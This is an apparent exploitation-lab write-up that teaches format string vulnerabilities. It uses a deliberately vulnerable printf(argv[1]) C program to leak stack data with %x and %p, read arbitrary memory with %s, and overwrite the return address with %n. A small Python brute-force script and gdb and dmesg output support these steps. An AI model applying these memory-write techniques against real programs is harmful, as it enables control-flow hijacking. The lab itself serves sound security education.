### Info
In this lab, we'll try to exploit format string bugs<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR disabled<br>
**Keywords**: format string vulnerability

### Implementation
Format string vulnerabilities occur when a user controlled string is passed to the printf like functions (sprintf, snprintf ...)
as the format parameter.
Here is the minimum example code:
```
int main(int argc, char **argv)
{
    int var = 0xdeadcafe;
    printf(argv[1]);
}
```
#### Increment 1: Exposing data from stack
A valid printf of usage with format specifier is as the following:
```
printf("Integer value is %d\n" , my_int_var);
```
If you omit the second parameter `my_int_var`, printf dumps the content in the next word in stack. On the other hand, if you specify 
more specifiers than the number or arguments, again printf dumps data from stack.

Back to our example source code, before `call printf`, stack will look like below. The more specifier we pass to the program,
the more data we'll expose data from the stack.

``` 
+------------------------+
| address of format str  |
+------------------------+
| ..stack of main..      | 
+------------------------+
| deadcafe               | 
+------------------------+
| ..stack of main..      |
+------------------------+
| old ebp                |
+------------------------+
| ret addr               |
+------------------------+
higher address
```
We expose the data as the following. `;echo` is just added to have a new line after each output. By the way `;` is a seperator to
run multiple commands in one line.
```
uzi@pwnpatrol:$ ./fs '%x' ;echo
0
uzi@pwnpatrol:$ ./fs '%x,%x,%x' ;echo
0,ffffd600,80484bb
uzi@pwnpatrol:$ ./fs '%x,%x,%x,%x,%x,%x' ;echo
0,ffffd600,80484bb,2,ffffd5f4,ffffd600
uzi@pwnpatrol:$ ./fs '%x,%x,%x,%x,%x,%x,%x,%x,%x' ;echo
0,ffffd5f0,80484bb,2,ffffd5e4,ffffd5f0,deadcafe,f7fe59b0,ffffd550
``` 
As you see, we dumped several words in stack (some junk, some meaningful). Our local variable with value `0xdeadcafe` is somewhere around the middle of main function stack.
Format strings has two important features:
* We can specify the nth argument in format string directly. For example `0xdeadcafe` was the 7th word dumbed above. We can dump just it using `%<number>$specifier` syntax:
```
uzi@pwnpatrol:$ ./fs '%7$x'
deadcafe
```
PS: Notice that I used single qoutes around the argument. If you use double quotes, shell will try to expand $x.
* The more interesting feature is that using `n` specifier, the number of characters written so far is stored in the pointed location.
```
uzi@pwnpatrol:$ ./fs 'sample:%7$x' ;echo
sample:deadcafe
```
What will happen if I change the `x` to `n` in format string?
```
uzi@pwnpatrol:$ ./fs 'sample:%7$n' ;echo
Segmentation fault (core dumped)
```
To understand what happened, we can start the binary with gdb and run with 'sample:%7$n'
```
uzi@pwnpatrol:$ gdb -q fs
Reading symbols from fs...(no debugging symbols found)...done.
(gdb) r 'sample:%7$n'
Starting program: /home/uzi/exploit_labs/lab7_format_string/fs 'sample:%7$n'
Program received signal SIGSEGV, Segmentation fault.
0xf7e30745 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
Let's check segfaulting instruction and its operands. As explained above, it tried to write the length(7) of "sample:" to the location
pointed by 7th argument. In this case, it's not a valid address of the process, and therefore program segfaulted.

```
(gdb) x/i $eip
=> 0xf7e30745:  mov    DWORD PTR [eax],esi
(gdb) i r eax esi
eax            0xdeadcafe       -559035650
esi            0x7      7
```
#### Increment 2: Dumping program name (argv[0])
We need to understand how the program stack looks like with the program arguments. So we enlarge the sample stack above.
I run the binary with 'arg' as parameter: `./fs arg`. Here is the stack just before `call printf`:
```
      +------------+--------------------+
      |  address   |   content          |
      +------------+--------------------+
  /-< | 0xffffd530 | 0xffffd742         |       <-- address of format str
 /    +------------+--------------------+
|     |  ....      | ....               | ** |
|     +------------+--------------------+    | 
|     | 0xffffd54c | deadcafe           | ** |   
|     +------------+--------------------+    | main
|     |  ....      | ....               | ** | stack
|     +------------+--------------------+    |
|     |  ....      | ....               | ** | 
|     +------------+--------------------+
|     | 0xfffd56c  | libc_start_main+24 |       <-- return address to libc_start_main
|     +------------+--------------------+
|     | 0xfffd570  | 2                  |       <-- parameters of main: argc
|     +------------+--------------------+
|     | 0xfffd574  | 0xfffd604          | >-\   <-- parameters of main: location of *argv[] array
|     +------------+--------------------+    \  
|     |  ....      | ....               |    |  
|     +------------+--------------------+    |   
|     |  ....      | ....               |    |
|     +------------+--------------------+    /
|     | 0xfffd604  | 0xffffd73e         | <-/  >-\  <-- argv[0] pointer deep in stack
|     +------------+--------------------+         \
|     | 0xfffd608  | 0xffffd742         | >-\     | <-- argv[1] pointer deep in stack 
|     +------------+--------------------+   |     |
|     |  ....      | ....               |   |     |
|     +------------+--------------------+   |     /
|     | 0xffffd73e | '.','/','f','s'    |   |  <-/  <-- argv[0] value "fs"
 \    +------------+--------------------+   |
  \-> | 0xffffd742 | '\0','a','r', 'g'  | <-/       <-- argv[1] value  
      +------------+--------------------+
```
By following a bottom to top approach, we can understand the stack
* In the deepest level, there's actually environment variables string but I didn't draw them since we are not interested.
* Then comes the command line arguments. Remember that the program itself is the argument zero. Address 0xffffd73e
contains the program name, 0xffffd742 contains the first argument.
* After some unused area, pointers to each environment variable and pointers to each argument. Address 0xfffd604, 0xfffd608 are those pointers to argument zero and argument one.
* The comes some linker variables. After that `main` is to be called. Therefore envp, argv, and argc are pushed to the stack. Therefore
at 0xfffd574, we have the beginning address of argv pointers.
* Due to `printf(argv[1])`, 0xffffd742 pushed to stack before calling printf.

By looking at this layout, theoretically we can say that if we try increasing numbers in `./fs '%<number>$x'`, we can dump the name of program at address 0xffffd73e or its arguments. Let's try that. We'll try many numbers and try to see the following bytes. 
```
uzi@pwnpatrol:$ xxd -g 1 <<< './fs'
00000000: 2e 2f 66 73
```
It makes sense to check this with a simple shell script and we look for one of above hex numbers. We only look for one, since program prints only one word at a time, and "./fs" may be distributed to two words.
```
uzi@pwnpatrol:$ for i in {001..200}; do echo -n "i:$i "; ./fs "%$i\$p"; echo ; done  | grep -C 1 73
i:072 0xffffde9f
i:073 0xffffdebe
i:074 0xffffdf34
--
i:131 0x2f2e0000
i:132 0x25007366
i:133 0x24333331
```
It's clear that the program name "./fs" can be reached when we dump 131st and 132nd words. Due to little endianness, they look reversed.
```
uzi@pwnpatrol:$ ./fs '%131$p'
0x2f2e0000
uzi@pwnpatrol:$ ./fs '%132$p'
0x25007366
```
However be aware that when the length or number or environment is changed, these numbers will be changed as well. For example I've added another argument and dumping 131st word results different. As you can guess, all these things are in stack so their existence, changes the stack as well.
```
uzi@pwnpatrol:$ ./fs '%131$p' asd
0x25007366
```
#### Increment 3: Reading a valid address
What can we do when we go further and dump the argument of program. For this reason I created a simple signature ABCD and used it in format string. Let's try to dump 131st and 132nd word. Well we see that it's dumped (0x4241...., 0x....4443)
```
uzi@pwnpatrol:$ ./fs 'ABCD %131$p' 
ABCD 0x42410073
uzi@pwnpatrol:$ ./fs 'ABCD %132$p' 
ABCD 0x25204443
```
I'll add some more space to see it in one word
```
$ ./fs $'ABCD   %131$p' 
ABCD   0x44434241
```
Now you can image that if we write a valid memory address instead of ABCD and use %s format specifier, we can see the content of that address till the null byte.
As a target, we'll read opcodes of main function, let's check them first.
```
uzi@pwnpatrol:$ objdump -Mintel -d fs | grep -A 5 "<main>"
08048426 <main>:
 8048426:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804842a:       83 e4 f0 
```
Now we'll put the address 0x08048426 to the beginning of format string. The easiest way is to use shell feature for escaping bytes using ANSI-C syntax. Below you can observe the opcodes starting with 8th byte.
```
uzi@pwnpatrol:$ ./fs $'\x26\x84\x04\x08   %131$s' | xxd -g 1
00000000: 26 84 04 08 20 20 20 8d 4c 24 04 83 e4 f0 ff 71  &...   .L$.....q
00000010: fc 55 89 e5 51 83 ec 14 89 c8 c7 45 f4 fe ca ad  .U..Q......E....
00000020: de 8b 40 04 83 c0 04 8b
```
#### Increment 4: Writing to a valid address
The last thing to do is to write to a valid and writable memory region of the process. Let's try to override the return address to libc_start_main. With ASLR disabled, we can easilfy find it with gdb, but the more different tools, techniques we use, the more we'll be experienced. But then, how will we find the address to override?<br/>
As we did above, we'll dump some values from stack and try to guess a range.
```
uzi@pwnpatrol:$ for i in {1..10}; do ./fs "ABCD   %$i\$x"; echo ; done
ABCD   0
ABCD   ffffd600
ABCD   80484bb
ABCD   2
ABCD   ffffd5f4
ABCD   ffffd600
ABCD   deadcafe
ABCD   f7fe59b0
ABCD   ffffd560
```
The values 0xffffd560,0xffffd600 looks like they are addresses from stack, why? They start with 0xffff, they are close to each other.<br/>
We'll run the application many times, and each trial, we'll try to write a dummy value to location 0xffffd550 - 0xffffd610. I selected these values based on samples I've found and added some margin to them. If we hit the return address in one of these attempts, application should get a segmentation fault due to bad $eip address.<br/>
For this purpose, I've created a simple script that generates just the commands because it was really complex to embed it into a shell script. 
```
uzi@pwnpatrol:$ cat cmds.py 
for i in range(0xd500,0xd620,4):
    bytes = i.to_bytes(2,'little')
    print(rf"./fs $'\x{bytes[0]:02x}\x{bytes[1]:02x}\xff\xff   %131$n'")
```
When commands generated I need to run them:
* The simplest and convenient way is to use shell builtin `source`. It basically executes commands from a file in the current shell. It doesn't cause a change in environment variables since it doesn't run the commands within a new shell. The dot operator `.` is same as `source`.
* With the `<(python3 cmds.py)` feature, shell creates a temporary file on the fly and pass its name. So I don't need to create a file manually. Run it, and you'll see output like below.

```
uzi@pwnpatrol:$ . <(python3 cmds.py)
P���   T���   X���   Segmentation fault (core dumped)
����   ����   ���  ���   
...
```
One segmentation fault occured, let's check what happened via `dmesg`.
```
[ 9686.269766] fs[3877]: segfault at 7 ip 0000000000000007 sp 00000000ffffd560 error 14 in fs[8048000+1000]
```
It seems that we succesfully overriden the return address, because $eip is 7. The value of $esp at that moment was 0xffffd560. So we can say that the return address was $esp - 4, that is 0xffffd55c. The 9th value we dumped in stack at the beginning of increment 4 was 0xffffd560. So we can consider a relation between that value and location of return address. Hmm mystery...





